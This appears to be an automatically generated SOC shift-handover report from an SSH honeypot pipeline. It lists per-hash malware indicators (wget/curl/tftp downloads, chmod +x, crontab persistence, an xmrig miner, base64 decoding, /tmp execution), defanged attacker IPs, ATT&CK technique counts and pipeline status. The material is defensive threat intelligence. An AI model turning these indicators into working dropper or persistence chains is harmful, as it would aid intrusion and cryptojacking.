- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `109.160.32[.]32` | DE | Global Communication Net Plc | **100** ⚠️ | 35 |
| `45.167.80[.]94` | BR | LG Telecomunicacoes | **100** ⚠️ | 11 |
| `70.184.82[.]170` | US | Cox Communications | **100** ⚠️ | 5 |
| `199.165.159[.]105` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 9 |
| `183.171.9[.]22` | MY | Celcom Axiata Berhad | **100** ⚠️ | 37 |
| `103.159.2[.]113` | BD | Skymax Communication | **100** ⚠️ | 50 |
| `102.210.148[.]41` | KE | THE KONZA TECHNOPOLIS DEVELOPMENT AUTHORITY | **100** ⚠️ | 24 |
| `103.140.18[.]186` | IN | City Online Ap Private Ltd | **100** ⚠️ | 6 |
| `202.88.209[.]51` | IN | HATHWAY CABLE AND DATACOM LIMITED | **100** ⚠️ | 13 |
| `203.192.211[.]180` | IN | Indusind Media And Communication Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 464 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 461 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 266 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 25 |

---

## 🔕 False Positive Summary (89 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 30 |
| AbuseIPDB score 1 below threshold 25 | 8 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 7 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 5 |
| AbuseIPDB score 23 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 667 cases |
| Tool 34  | Credential Extractor        | ✅ 5060 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 32 fingerprints |
| Tool 36  | Command Clustering          | ✅ 285 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 258 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 89 filtered (13.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 134 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 448 priority case(s) shown individually · 120 recon entry/entries in table (9 group(s) consolidating 19 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-12T19:22:11Z_
